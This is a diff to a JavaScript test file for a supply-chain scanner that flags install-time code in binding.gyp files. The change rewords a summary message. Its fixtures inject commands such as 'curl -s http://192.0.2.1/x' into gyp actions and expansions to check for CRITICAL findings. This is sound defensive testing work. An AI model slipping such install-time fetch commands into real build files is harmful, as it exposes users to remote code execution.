@@ -40,10 +40,10 @@ test("many actions are listed in part; the summary keeps the highest severity", 
   const summary = hooks.at(-1);
   assert.deepEqual([summary.sev, summary.line, summary.cmd], ["MAJOR", 102, undefined]);
   assert.equal(summary.msg, "400 more binding.gyp actions and command expansions run code at install time " +
-    "(0 of them fetch or evaluate code); only the first 100 are listed.");
+    "(0 of them look hostile); only the first 100 are listed.");
   const bad = scanGyp("binding.gyp", actions(150).replace("['t000140']", "['curl', 'http://192.0.2.1/x']")).at(-1);
   assert.equal(bad.sev, "CRITICAL");
-  assert.match(bad.msg, /^50 more binding\.gyp actions .*\(1 of them fetch or evaluate code\)/);
+  assert.match(bad.msg, /^50 more binding\.gyp actions .*\(1 of them look hostile\)/);
   const exp = scanGyp("binding.gyp", expansions(250, "curl -s http://192.0.2.1/x"));
   assert.equal(exp.length, 101);
   assert.deepEqual(brief(exp).at(-1), ["SC-INSTALL-HOOK", 1, "CRITICAL"]);
